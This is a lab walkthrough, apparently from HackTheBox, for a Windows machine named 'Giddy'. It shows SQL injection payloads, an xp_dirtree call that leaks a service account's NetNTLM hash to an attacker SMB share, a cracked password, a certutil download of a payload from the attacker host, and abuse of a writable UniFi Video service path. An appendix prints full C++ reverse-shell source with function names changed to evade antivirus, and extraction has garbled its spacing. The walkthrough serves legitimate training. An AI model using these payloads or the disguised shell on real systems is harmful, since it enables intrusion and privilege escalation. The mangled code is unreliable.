@@ -1,0 +1,242 @@
+Giddy
+
+12th February 2019 / Document No D19.100.07
+
+Prepared By: egre55
+Machine Author: lkys37en
+Difficulty: Medium
+Classification: Official
+
+                                                                        Page 1 / 13
+SYNOPSIS
+
+Giddy is a medium difficulty machine, which highlights how low privileged SQL Server logins can
+be used to compromise the underlying SQL Server service account. This is an issue in many
+environments, and depending on the configuration, the service account may have elevated
+privileges across the domain. It also features Windows registry enumeration and custom payload
+creation.
+
+Skills Required                        Skills Learned
+
+     Basic knowledge of SQL injection       Using xp_dirtree to leak the SQL Server
+         techniques                             service account NetNTLM hash
+
+     Basic knowledge of Windows             Identification of installed programs via
+                                                Windows Registry enumeration
+
+                                            Reverse shell payload creation
+
+                                       Page 2 / 13
+Enumeration
+Nmap
+
+ masscan -p1-65535,U:1-65535 10.10.10.104 --rate=1000 -p1-65535,U:1-65535 -e tun0 > ports
+ ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" ' {print $1}' | sort -n | tr ' \n'
+ ',' | sed 's/,$//')
+ nmap -Pn -sV -sC -p$ ports 10.10.10.104
+
+IIS 10.0 is serving content on ports 80 and 443. This version of IIS shipped with Windows Server
+2016 and Windows 10. Two remote management services are also available (RDP and WinRM).
+
+                                                                                                                  Page 3 / 13
+Filebuster
+
+Filebuster, created by Tiago Sintra (@henshin) is used to enumerate available directories. It is a
+very fast Perl-based web fuzzer. Filebuster and dependencies are installed.
+ git clone https://github.com/henshin/filebuster
+ cpan install IO::Socket::Socks::Wrapper
+ cpan install List::MoreUtils
+ cpan install Net::DNS::Lite module
+ cpan install Furl
+ cpan install Cache::LRU module
+
+Filebuster is run, and it finds the directories "/remote" and "/mvc".
+ perl filebuster.pl -u https://10.10.10.104/{fuzz} -w
+ /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 20 -hc 400
+
+                                                                                                                  Page 4 / 13
+"/remote" points to a PowerShell Web Access page, while a custom web application containing a
+list of products is accessible at "/mvc".
+
+                                                                                                                  Page 5 / 13
+/mvc
+SQL Injection
+
+Appending the search term with a single quote results in a SQL error. After appending -- after the
+single quote, the SQL query completes successfully and data is returned. This confirms that the
+"ctl00$MainContent$SearchTerm" parameter is vulnerable to SQL injection.
+
+The statements below are executed in turn, and the 5 second delay for the != condition reveals
+that the SQL account in whose context the queries are executed, is not sa.
+ ' if (select user) = 'sa' waitfor delay '0:0:5'--
+ ' if (select user) != 'sa' waitfor delay '0:0:5'--
+
+                                                                                                                  Page 6 / 13
+Capture and crack NetNTLM hash
+
+xp_dirtree is an undocumented MSSQL stored procedure that allows for interaction with local
+and remote filesystems. The MSSQL Server service account can be made to initiate a remote
+SMB connection using the command below.
+ '+EXEC+master.sys.xp_dirtree+'\\10.10.14.9\share--
+
+By standing up Responder, Inveigh or Impacket's smbserver.py, is it possible to capture the
+NetNTLM hash. This hash can be subjected to an offline attack in order to recover the password.
+If the account has administrative permissions, the request can also be reflected or relayed to
+directly access other network resources, which is useful in cases where is is not possible to
+recover the cleartext password.
+
+The user associated with the captured hash is "Stacy". John The Ripper is used to crash the hash,
+and the password is quickly found.
+ /opt/john/run/john stacy.hash --wordlist=/usr/share/wordlists/rockyou.txt
+stacy:xNnWo6272k7x
+
+                                                                                                                  Page 7 / 13
+PowerShell Web Access
+
+The gained credentials are used to log in to PowerShell Web Access. The username is
+prepended with .\ , so Windows interprets this as a local, rather than a domain login.
+The PowerShell 2.0 engine has not been installed. AppLocker has been enabled, which places
+PowerShell into ConstrainedLanguage mode.
+ powershell -v 2.0 -c $psversiontable
+ $host.runspace.languagemode
+ Get-AppLockerPolicy -Local
+
+Is doesn't seem possible to interact with WMI using Powershell or wmic.exe, or enumerate
+services.
+
+                                                                                                                  Page 8 / 13
+Identification of Ubiquiti UniFi Video
+
+In order to identify installed programs, the following registry query is executed. An entry exists for
+"Ubiquiti UniFi Video".
+ cmd /c REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall
+
+In his Giddy video, IppSec also shows how service information can be extracted from the registry,
+and is worth checking out.
+
+                                                                                                                  Page 9 / 13
+Privilege Escalation
+Identification of vulnerability
+
+searchsploit reveals that Ubiquiti UniFi Video suffers from a privilege escalation vulnerability. The
+exploit is copied to the current working directory for further inspection.
+ searchsploit unifi video -m 43390
+The issue is that Ubiquiti UniFi Video runs in the context of the "NT AUTHORITY/SYSTEM", and
+upon starting or stopping the service, it will attempt to execute the taskkill.exe binary from the
+location "C:\ProgramData\unifi-video\", which is writable by all users. It is confirmed that the
+location is writable, and the service is stoppable/startable.
+ icacls unifi-video
+ Get-Service "Ubiquiti UniFi Video" | fl *
+
+                                                                                                                 Page 10 / 13
+Exploitation
+
+@paranoidninja has made "prometheus", a simple C++ TCP reverse shell, which will be used to
+create the malicious taskkill.exe. The function names have been changed and comments
+removed in order to reduce the likelihood of signature-based antivirus detection (see Appendix
+A) .
+https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp
+Mingw-w64 is installed and the binary is compiled.
+ apt-get install g++-mingw-w64
+ i686-w64-mingw32-g++ prometheus.cpp -o taskkill.exe -lws2_32 -s -ffunction-sections
+ -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants
+ -static-libstdc++ -static-libgcc
+
+A nc listener and web server are stood up and the binary is copied over.
+ certutil -verifyctl -split -f http://10.10.14.8/taskkill.exe
+ mv *.bin taskkill.exe
+ Stop-Service "Ubiquiti UniFi Video"
+After stopping the "Ubiquiti UniFi Video" service (it may be necessary to start/stop a couple of
+times to trigger the taskkill.exe process), a shell is received as "NT AUTHORITY\SYSTEM".
+
+                                                                                                                  Page 11 / 13
+Appendix A
+
+ #include <winsock2.h>
+ #include <windows.h>
+ #include <ws2tcpip.h>
+ #pragma comment(lib, "Ws2_32.lib")
+ #define DEFAULT_BUFLEN 1024
+
+ void X TJRSHZ(char* XGFXEG, int XERGTJ) {
+        while( t rue) {
+              Sleep(5 000);
+
+              SOCKET REXQGW;
+              sockaddr_in addr;
+              WSADATA version;
+              WSAStartup(MAKEWORD(2 ,2 ), &version);
+              REXQGW = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned
+ int)NULL, (u nsigned int)NULL);
+              addr.sin_family = AF_INET;
+
+              addr.sin_addr.s_addr = inet_addr(XGFXEG);
+              addr.sin_port = htons(XERGTJ);
+
+              i f (WSAConnect(REXQGW, (SOCKADDR*)&addr, sizeof( addr), N ULL, N ULL, N ULL,
+ NULL) ==SOCKET_ERROR) {
+
+                     closesocket(REXQGW);
+                     WSACleanup();
+                     c ontinue;
+              }
+              else {
+                     char RecvData[DEFAULT_BUFLEN];
+                     m emset(RecvData, 0 , s izeof(RecvData));
+                     i nt RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0 );
+                     if (RecvCode <= 0 ) {
+
+                            closesocket(REXQGW);
+                            WSACleanup();
+                            continue;
+                     }
+                     e lse {
+
+                                                                                                                 Page 12 / 13
+                          char Process[] = " cmd.exe";
+                          STARTUPINFO sinfo;
+                          PROCESS_INFORMATION pinfo;
+                          m emset(&sinfo, 0, sizeof(sinfo));
+                          sinfo.cb = sizeof(sinfo);
+                          sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
+                          sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)
+REXQGW;
+                          CreateProcess(N ULL, Process, N ULL, NULL, TRUE, 0 , NULL, N ULL,
+&sinfo, &pinfo);
+                          WaitForSingleObject(pinfo.hProcess, INFINITE);
+                          CloseHandle(pinfo.hProcess);
+                          CloseHandle(pinfo.hThread);
+
+                          memset( RecvData, 0 , s izeof( RecvData));
+                          i nt RecvCode = recv(REXQGW, RecvData, DEFAULT_BUFLEN, 0 ) ;
+                          i f (RecvCode <= 0 ) {
+
+                                 closesocket(REXQGW);
+                                 WSACleanup();
+                                 continue;
+                          }
+                          if (s trcmp(RecvData, "exit\n") == 0 ) {
+                                 e xit( 0 ) ;
+                          }
+                   }
+             }
+      }
+}
+int m ain(int argc, c har **argv) {
+      FreeConsole();
+      if (argc == 3) {
+             int port = atoi(argv[2]);
+             XTJRSHZ(argv[1] , port);
+      }
+      else {
+             c har host[] = "10.10.14.8";
+             int port = 443;
+             XTJRSHZ(host, port);
+      }
+      r eturn 0;
+}
+
+                                                                                                               prometheus.cpp
+
+                                                                                                                Page 13 / 13
+
